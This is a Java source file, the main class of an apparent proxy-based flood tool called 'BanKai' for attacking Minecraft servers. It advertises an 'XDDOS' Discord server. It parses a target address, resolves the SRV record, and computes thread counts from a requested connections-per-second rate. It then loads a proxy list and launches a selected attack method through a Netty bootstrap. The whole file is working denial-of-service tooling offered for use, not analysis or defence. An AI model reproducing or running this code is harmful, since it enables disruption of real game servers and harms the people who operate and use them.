package dev.xdmeow;

import dev.xdmeow.core.NettyBootstrap;
import dev.xdmeow.core.methods.IMethod;
import dev.xdmeow.core.methods.Methods;
import dev.xdmeow.core.util.helper.ArgsHelper;
import dev.xdmeow.core.util.helper.ServerAddress;

import java.io.File;
import java.net.InetAddress;

public class BanKai {
    public static int port;
    public static int protocol;
    public static int protocolLength;
    public static int CPS;
    public static int targetCPS;
    public static int nettyThreads;
    public static int loopThreads;
    public static int duration;
    public static String methodID;
    public static IMethod method;
    public static String srvRecord;
    public static String srvIP;
    public static InetAddress resolved;
    public static int proxyType;
    public static String proxyFilePath;

    public static File proxyFile;
    public static String Discord = "CatOnDrugs#1521";
    public static Object protcolID;

    public static void main(String[] args) {

        System.out.println("$$$$$$$\\   $$$$$$\\  $$\\   $$\\ $$\\   $$\\  $$$$$$\\  $$$$$$\\ \n" +
                "$$  __$$\\ $$  __$$\\ $$$\\  $$ |$$ | $$  |$$  __$$\\ \\_$$  _|\n" +
                "$$ |  $$ |$$ /  $$ |$$$$\\ $$ |$$ |$$  / $$ /  $$ |  $$ |  \n" +
                "$$$$$$$\\ |$$$$$$$$ |$$ $$\\$$ |$$$$$  /  $$$$$$$$ |  $$ |  \n" +
                "$$  __$$\\ $$  __$$ |$$ \\$$$$ |$$  $$<   $$  __$$ |  $$ |  \n" +
                "$$ |  $$ |$$ |  $$ |$$ |\\$$$ |$$ |\\$$\\  $$ |  $$ |  $$ |  \n" +
                "$$$$$$$  |$$ |  $$ |$$ | \\$$ |$$ | \\$$\\ $$ |  $$ |$$$$$$\\ \n" +
                "\\_______/ \\__|  \\__|\\__|  \\__|\\__|  \\__|\\__|  \\__|\\______|\n" +
                "Made by:"+Discord+"\n" +
                "Discord Server Discord.io/XDDOS");

        if (args.length == 0) {
            ArgsHelper.friendly();
        }
        else {
            ArgsHelper.oneline(args);
        }
        System.out.println("Starting...");
        try {
            ServerAddress sa = ServerAddress.getAddrss(srvIP);
            srvRecord = sa.getIP();
            port = sa.getPort();
            resolved = InetAddress.getByName(srvRecord);
            targetCPS = CPS + (int) Math.ceil((double) CPS / 100 * (50 + (double) CPS / 5000));
            nettyThreads = targetCPS == -1 ? 256 : (int) Math.ceil(6.4E-4D * (double) targetCPS);
            loopThreads = targetCPS == -1 ? 3 : (int) Math.ceil(1.999960000799984E-5D * (double) targetCPS);
            protocolLength = protocol > 128 ? 3 : 2;
        }catch (Exception e){
            e.printStackTrace();
            System.exit(0);
        }
        proxyFile = new File(proxyFilePath);
        if(!proxyFile.exists()){
            System.out.println("Proxy file not found!");
            System.exit(0);
        }
        Methods.setupMethods();
        method = Methods.getMethod(methodID);
        System.out.println("Running Method: " + method.toString().split("@")[0]+"\n");
        new NettyBootstrap().start();
    }
}